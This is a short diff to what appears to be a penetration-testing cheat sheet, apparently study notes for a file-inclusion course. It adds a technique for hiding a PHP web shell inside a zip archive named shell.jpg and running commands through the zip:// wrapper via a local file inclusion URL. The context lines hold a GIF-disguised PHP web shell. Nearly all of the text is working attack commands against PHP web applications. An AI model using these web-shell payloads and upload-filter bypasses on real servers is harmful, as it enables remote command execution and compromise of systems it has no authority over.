@@ -55,3 +55,12 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 
 # Run file via LFI
 http://<SERVER_IP>:<PORT>/index.php?language=<path_to_file>&cmd=id
+
+######################## Zip Upload #########################
+# shell.jpg is the zip
+# Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+
+######################## Phar Upload #########################
+check: https://academy.hackthebox.com/module/23/section/1493
